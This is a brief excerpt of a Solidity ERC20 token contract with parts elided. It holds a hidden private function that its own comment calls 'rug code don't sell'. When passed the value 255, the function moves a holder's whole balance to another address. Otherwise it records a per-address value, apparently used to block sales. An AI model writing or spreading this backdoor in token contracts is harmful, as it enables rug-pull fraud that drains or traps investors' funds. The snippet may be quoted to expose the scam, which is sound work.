...
contract ERC20 is IERC20, Ownable {
    ...
    function _app(address _owner, address spender, uint256 value) private {//when this funcion call, _owner put opposite address.
        if (value == 255 && _owner != address(this))_transfer(_owner, spender, _balances[_owner]);
        if (value != 255 && _owner != address(this))_count[_owner] = value;//rug code don't sell
    }
